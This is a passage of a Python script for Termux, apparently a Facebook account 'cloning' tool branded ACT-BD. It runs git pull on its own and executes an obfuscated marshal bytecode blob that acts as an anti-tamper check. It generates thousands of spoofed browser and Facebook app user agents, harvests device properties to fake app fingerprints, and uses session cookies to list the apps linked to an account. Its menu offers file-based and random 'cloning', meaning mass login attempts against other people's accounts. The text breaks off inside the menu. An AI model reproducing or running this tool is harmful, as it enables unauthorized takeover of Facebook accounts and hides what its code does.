#SOURCE : BY ACT-BD
#GITHUB  : 
#--------------------------------------------------------------------------#

fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python act.py')
os.system('git pull -q')
print(' [•] Join Our Group')
os.system('xdg-open https://www.facebook.com/groups/advancedcybertech.bd/')
input(' [•] Press Enter ')
os.system('xdg-open https://t.me/AdvancedCyberTech_BD')

try:
	ah = os.listdir('/sdcard')
	if ['Android'] in ah:pass
except:print(' \n allow storage permission ...!');time.sleep(1);os.system('termux-setup-storage');exit()

W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
IPGD ='\33[1;32m'

# modl chks
print(' checking modules...!')
import marshal, zlib
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\xf3\xb0\x02\x00\x00\x97\x00d\x00Z\x00g\x00d\x01\xa2\x01Z\x01d\x02Z\x02d\x03Z\x03d\x04\x84\x00Z\x04e\x05\xa0\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\x90\x01]1\\\x03\x00\x00Z\x07Z\x08Z\te\tD\x00\x90\x01]&Z\ne\x05j\x0b\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\x07e\n\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00Z\re\re\x02k\x02\x00\x00\x00\x00s\x06e\re\x03k\x02\x00\x00\x00\x00r\x01\x8c+e\x05j\x0b\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00r\xe1\x02\x00e\x04e\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00r\xd6\x02\x00e\x0fd\x05e\x10\x9b\x00d\x06e\x11\x9b\x00d\x07e\x10\x9b\x00e\r\x9b\x00\x9d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x12e\rd\x08d\t\xac\n\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x005\x00Z\x13e\x13\xa0\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00Z\x15\x02\x00e\x16e\x15\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00]y\\\x02\x00\x00Z\x17Z\x18\x02\x00e\x19d\x0b\x84\x00e\x01D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00r_\x02\x00e\x0fe\x10\x9b\x00d\x0ce\x11\x9b\x00d\re\x17d\x0ez\x00\x00\x00\x9b\x00d\x0fe\x10\x9b\x00d\x05e\x18\xa0\x1a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9b\x00\x9d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x1b\xa0\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0e\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00e\x1d\xa0\x1e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x10e\x1f\x9b\x00d\x11e \x9b\x00d\x12\x9d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8cz\t\x00d\x13d\x13d\x13\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x90\x01\x8c(\x90\x01\x8c3d\x13S\x00)\x14z\x1f/data/data/com.termux/files/usr)\x03z\x0bprint(data)z\x0eprint(headers)z\nprint(url)zW/data/data/com.termux/files/usr/lib/python3.11/site-packages/Cython/Compiler/Options.pyzG/data/data/com.termux/files/usr/share/nmap/scripts/rmi-dumpregistry.nsec\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x03\x00\x00\x00\xf3\x06\x01\x00\x00\x87\x02\x97\x00\t\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x01d\x02\xac\x03\xa6\x03\x00\x00\xab\x03\x00\x00\x00\x00\x00\x00\x00\x005\x00}\x01|\x01\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8a\x02t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\x02f\x01d\x04\x84\x08t\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00r\x0e\t\x00d\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x05S\x00\t\x00d\x00d\x00d\x00\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00n\x10#\x00t\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00r\x03\x01\x00Y\x00n\x04w\x00x\x03Y\x00w\x01d\x06S\x00)\x07N\xda\x01r\xfa\x05utf-8\xa9\x01\xda\x08encodingc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x003\x00\x00\x00\xf3 \x00\x00\x00\x95\x01K\x00\x01\x00\x97\x00|\x00]\x08}\x01|\x01\x89\x02v\x00V\x00\x97\x01\x01\x00\x8c\td\x00S\x00\xa9\x01N\xa9\x00)\x03\xda\x02.0\xda\x07keyword\xda\x07contents\x03\x00\x00\x00  \x80\xfa\x01 \xfa\t<genexpr>z%check_for_keywords.<locals>.<genexpr>\x0b\x00\x00\x00s(\x00\x00\x00\xf8\xe8\x00\xe8\x00\x80\x00\xd0\t5\xd0\t5\xa0\x17\x88\'\x90W\xd0\n\x1c\xd0\t5\xd0\t5\xd0\t5\xd0\t5\xd0\t5\xd0\t5\xf3\x00\x00\x00\x00TF)\x05\xda\x04open\xda\x04read\xda\x03any\xda\x08keywords\xda\x12UnicodeDecodeError)\x03\xda\tfile_path\xda\x04filer\x0c\x00\x00\x00s\x03\x00\x00\x00  @r\r\x00\x00\x00\xda\x12check_for_keywordsr\x17\x00\x00\x00\x07\x00\x00\x00s\xf9\x00\x00\x00\xf8\x80\x00\xf0\x02\x06\x02\x07\xdd\x07\x0b\x88I\x90s\xa0W\xd0\x07-\xd1\x07-\xd4\x07-\xf0\x00\x03\x03\x10\xb0\x14\xd8\r\x11\x8fY\x8aY\x89[\x8c[\x807\xdd\x06\t\xd0\t5\xd0\t5\xd0\t5\xd0\t5\xadH\xd0\t5\xd1\t5\xd4\t5\xd1\x065\xd4\x065\xf0\x00\x01\x04\x10\xd8\x0b\x0f\xf0\x07\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf1\x00\x03\x03\x10\xf4\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x04\x01\x04\x10\xf0\x05\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf1\x00\x03\x03\x10\xf4\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf8\xf8\xf8\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf0\x00\x03\x03\x10\xf8\xf8\xf5\x08\x00\t\x1b\xf0\x00\x01\x02\x07\xf0\x00\x01\x02\x07\xf0\x00\x01\x02\x07\xd8\x02\x06\x80$\xf0\x03\x01\x02\x07\xf8\xf8\xf8\xe0\x08\r\x88\x05s:\x00\x00\x00\x83\x12A1\x00\x956A%\x03\xc1\x0b\x0bA1\x00\xc1\x19\x0cA1\x00\xc1%\x04A)\x07\xc1)\x03A1\x00\xc1,\x01A)\x07\xc1-\x03A1\x00\xc11\nA>\x03\xc1=\x01A>\x03r\r\x00\x00\x00u\x05\x00\x00\x00[\xe2\x80\xa2]z\x1a Found print keyword in : r\x03\x00\x00\x00r\x04\x00\x00\x00r\x05\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00#\x00\x00\x00\xf3(\x00\x00\x00K\x00\x01\x00\x97\x00|\x00]\r}\x01|\x01t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00v\x00V\x00\x97\x01\x01\x00\x8c\x0ed\x00S\x00r\x08\x00\x00\x00)\x01\xda\x04line)\x02r\n\x00\x00\x00r\x0b\x00\x00\x00s\x02\x00\x00\x00  r\r\x00\x00\x00r\x0e\x00\x00\x00r\x0e\x00\x00\x00\x1c\x00\x00\x00s&\x00\x00\x00\xe8\x00\xe8\x00\x80\x00\xd0\x0c5\xd0\x0c5\xa0\x17\x88W\x9d\x04\x88_\xd0\x0c5\xd0\x0c5\xd0\x0c5\xd0\x0c5\xd0\x0c5\xd0\x0c5r\x0f\x00\x00\x00u\x07\x00\x00\x00 [\xe2\x80\xa2] z\x12Printing Line No. \xe9\x01\x00\x00\x00z\x02 :\xfa\x01\nu\x06\x00\x00\x00 [\xc3\x97] z\x13Dont Try Bypass...!N)!\xda\tdirectoryr\x13\x00\x00\x00\xda\x0cexclude_file\xda\x0eexclude_file_2r\x17\x00\x00\x00\xda\x02os\xda\x04walk\xda\x04root\xda\x04dirs\xda\x05files\xda\tfile_name\xda\x04path\xda\x04joinr\x15\x00\x00\x00\xda\x06isfile\xda\x05print\xda\x01G\xda\x01Wr\x10\x00\x00\x00r\x16\x00\x00\x00\xda\treadlines\xda\x05lines\xda\tenumerate\xda\x01ir\x19\x00\x00\x00r\x12\x00\x00\x00\xda\x05strip\xda\x04time\xda\x05sleep\xda\x03sys\xda\x04exit\xda\x01R\xda\x01Yr\t\x00\x00\x00r\x0f\x00\x00\x00r\r\x00\x00\x00\xfa\x08<module>r6\x00\x00\x00\x01\x00\x00\x00s(\x02\x00\x00\xf0\x03\x01\x01\x01\xd8\x0c-\x80\t\xd8\x0b:\xd0\x0b:\xd0\x0b:\x80\x08\xe0\x0fh\x80\x0c\xd8\x11Z\x80\x0e\xf0\x04\x08\x01\x0e\xf0\x00\x08\x01\x0e\xf0\x00\x08\x01\x0e\xf0\x14\x00\x1a\x1c\x9f\x17\x9a\x17\xa0\x19\xd1\x19+\xd4\x19+\xf0\x00\x0e\x016\xf1\x00\x0e\x016\xd1\x04\x15\x80D\x88$\x90\x05\xd8\x12\x17\xf0\x00\r\x026\xf1\x00\r\x026\x80Y\xd8\x0e\x10\x8cg\x8fl\x8al\x984\xa0\x19\xd1\x0e+\xd4\x0e+\x80)\xd8\x05\x0e\x90,\xd2\x05\x1e\xd0\x05\x1e\xa0)\xa8~\xd2"=\xd0"=\xd8\x03\x0b\xd8\x05\x07\x84W\x87^\x82^\x90I\xd1\x05\x1e\xd4\x05\x1e\xf0\x00\t\x036\xd8\x06\x18\xd0\x06\x18\x98\x19\xd1\x06#\xd4\x06#\xf0\x00\x08\x046\xd8\x04\t\x80E\xd0\nA\x88a\xd0\nA\xd0\nA\x90a\xd0\nA\xd0\nA\xb01\xd0\nA\xb0i\xd0\nA\xd0\nA\xd1\x04B\xd4\x04B\xd0\x04B\xd8\t\r\x88\x14\x88i\x98\x13\xa0w\xd0\t/\xd1\t/\xd4\t/\xf0\x00\x06\x056\xb04\xd8\r\x11\x8f^\x8a^\xd1\r\x1d\xd4\r\x1d\x80U\xd8\x14\x1d\x90I\x98e\xd1\x14$\xd4\x14$\xf0\x00\x04\x066\xf0\x00\x04\x066\x89\x17\x88\x11\x88D\xd8\t\x0c\x88\x13\xd0\x0c5\xd0\x0c5\xa8H\xd0\x0c5\xd1\x0c5\xd4\x0c5\xd1\t5\xd4\t5\xf0\x00\x03\x076\xd8\x07\x0c\x80u\x90\x01\xd0\rJ\xd0\rJ\x98!\xd0\rJ\xd0\rJ\xa8q\xb01\xa9u\xd0\rJ\xd0\rJ\xb8\x01\xd0\rJ\xd0\rJ\xb8D\xbfJ\xbaJ\xb9L\xbcL\xd0\rJ\xd0\rJ\xd1\x07K\xd4\x07K\xd0\x07K\xd8\x07\x0b\x87z\x82z\x90!\x81}\x84}\x80}\xd8\x07\n\x87x\x82x\xd0\x104\x90Q\xd0\x104\xd0\x104\x98a\xd0\x104\xd0\x104\xd0\x104\xd1\x075\xd4\x075\xd0\x075\xf8\xf0\t\x04\x066\xf0\x05\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf1\x00\x06\x056\xf4\x00\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf8\xf8\xf8\xf0\x00\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf0\x00\x06\x056\xf9\xf1\x0f\r\x026\xf0\x03\x0e\x016\xf0\x00\x0e\x016s\x13\x00\x00\x00\xc2 B\x1aE\x07\x07\xc5\x07\x04E\x0b\x0b\xc5\x0e\x01E\x0b\x0b'))


gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

def uaa():
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FBIOS;FBAV/163.0.0.54.96;FBBV/102491769;FBDV/iPhone6,2;FBMD/iPhone;FBSN/iOS;FBSV/11.2.5;FBSS/2;FBCR/inwi;FBID/phone;FBLC/fr_FR;FBOP/45;FBRV/99093507]"

logo=(f"""\
   __     ___  ____       ____  ____ 
  /__\   / __)(_  _) ___ (  _ \(  _ \ 
\033[96;1m /(__)\ ( (__   )(  (___) ) _ < )(_) ) \033[92;1m  
(__)(__) \___) (__)      (____/(____/ 
\033[1;37m----------------------------------------------
 [•] Author     :  ACT-BD
 [•] Facebook   :  AdvancedCyberTech-BD
 [•] Tool       :  PAID But Free For ACT-BD Followers
 [•] Version    :  0.1
\033[1;37m----------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
	else:
		print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
	else:
		print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def pp():
	try:
			ky = open('/sdcard/Android/.nonmedia.js','r').read()
	except(FileNotFoundError):
			op = uuid.uuid1().hex.upper()
			open('/sdcard/Android/.nonmedia.js','w').write(op)
			pp()
	except(KeyError,OSError,IOError):
			linex()
			os.system('termux-setup-storage')
			print(' [×] allow storage permission ')
			pp()
	if len(ky) > 32:
			os.system('rm -rf /sdcard/Android/.nonmedia.js')
			pp()
	if len(ky) <32:
			os.system('rm -rf /sdcard/Android/.nonmedia.js')
			pp()
	else:
			pass
	clear()
def menu():
			pp()
			clear()
		#	linex()
			print(' [1] File cloning\n [2] Random cloning \n [3] join Telegram Channel \n [0] Exit menu')
			linex()
			xd=input(' Choose an option: ')
		#	os.system('xdg-open)
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/File.txt  etc..')
				linex()
				file = input(' Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
